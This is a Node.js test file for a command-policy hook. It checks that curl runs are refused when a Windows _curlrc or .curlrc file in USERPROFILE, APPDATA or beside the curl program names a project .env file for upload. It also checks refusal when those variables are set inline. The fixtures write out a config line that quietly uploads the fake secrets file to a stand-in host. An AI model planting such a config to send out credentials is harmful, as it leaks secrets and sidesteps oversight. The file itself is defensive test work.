'use strict';

// curl on Windows reads _curlrc or .curlrc from USERPROFILE, APPDATA and the folder of the curl program. A default
// file there that names a protected file must be refused like ~/.curlrc. Values and paths are fake.

const { test, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const policy = require('../lib/hooks/policy');

const made = [];
after(() => {
  for (const d of made) fs.rmSync(d, { recursive: true, force: true });
});

const U = 'https://example.com/u';

function fixture() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'zn-winrc-'));
  made.push(root);
  const home = path.join(root, 'home');
  const proj = path.join(root, 'proj');
  fs.mkdirSync(home);
  fs.mkdirSync(proj);
  fs.writeFileSync(path.join(proj, '.env'), 'DB_PASSWORD=not-a-real-password-0000\n');
  return { root, home, proj };
}

const body = (proj) => 'upload-file = "' + path.join(proj, '.env') + '"\n';

for (const name of ['_curlrc', '.curlrc']) {
  test(`${name} in USERPROFILE and APPDATA that sends .env is refused`, () => {
    for (const key of ['USERPROFILE', 'APPDATA']) {
      const { root, home, proj } = fixture();
      const dir = path.join(root, key.toLowerCase());
      fs.mkdirSync(dir);
      const env = { HOME: home, [key]: dir };
      const opts = { home, cwd: proj, env };
      assert.equal(policy.bashDenial(`curl ${U}`, opts), null, 'no default file yet');
      fs.writeFileSync(path.join(dir, name), body(proj));
      assert.ok(policy.bashDenial(`curl ${U}`, opts), `${name} in ${key}`);
      assert.equal(policy.bashDenial(`curl -q ${U}`, opts), null, '-q skips it');
    }
  });
}

test('a _curlrc next to the curl program that sends .env is refused', () => {
  const { root, home, proj } = fixture();
  const bin = path.join(root, 'tools');
  fs.mkdirSync(bin);
  const opts = { home, cwd: proj, env: { HOME: home } };
  const cmd = `${bin}/curl ${U}`;
  assert.equal(policy.bashDenial(cmd, opts), null, 'no default file yet');
  fs.writeFileSync(path.join(bin, '_curlrc'), body(proj));
  assert.ok(policy.bashDenial(cmd, opts), '_curlrc beside the program');
  // A bare curl found in PATH uses the folder where it is found.
  fs.writeFileSync(path.join(bin, 'curl'), '');
  const o2 = { home, cwd: proj, env: { HOME: home, PATH: bin } };
  assert.ok(policy.bashDenial(`curl ${U}`, o2), '_curlrc beside curl found in PATH');
});

test('setting USERPROFILE or APPDATA in the command is refused (the folders cannot be checked)', () => {
  const { home, proj } = fixture();
  const opts = { home, cwd: proj, env: { HOME: home } };
  assert.ok(policy.bashDenial(`USERPROFILE=/x curl ${U}`, opts));
  assert.ok(policy.bashDenial(`APPDATA=/x curl ${U}`, opts));
});
